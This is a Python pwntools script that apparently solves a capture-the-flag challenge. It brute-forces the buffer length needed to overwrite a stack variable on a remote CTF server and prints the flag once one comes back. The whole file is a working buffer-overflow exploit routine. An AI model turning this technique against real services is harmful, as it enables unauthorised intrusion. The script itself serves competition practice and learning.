from pwn import *

# Target host and port
HOST = "codefest-ctf.iitbhu.tech"
PORT = 45045

# Target value to overwrite `var_14`
TARGET_VALUE = 0x23456723

def brute_force():
    for offset in range(1, 200):  # Adjust the range as needed
        try:
            # Connect to the remote server
            conn = remote(HOST, PORT)
            
            # Create the payload
            # Fill the buffer with "A" and overwrite `var_14` with TARGET_VALUE
            payload = b"A" * offset + p32(TARGET_VALUE)
            
            print(f"Trying offset: {offset}")
            
            # Send the payload
            conn.sendline(payload)
            
            # Receive and print the response
            response = conn.recvall(timeout=1).decode()
            print(response)
            
            # Check if the win() function was triggered
            if "CodeFest{" in response:  # Adjust this based on the flag format
                print(f"Success! Offset: {offset}")
                break
        except EOFError:
            pass  # Handle disconnections gracefully
        finally:
            conn.close()

if __name__ == "__main__":
    brute_force()

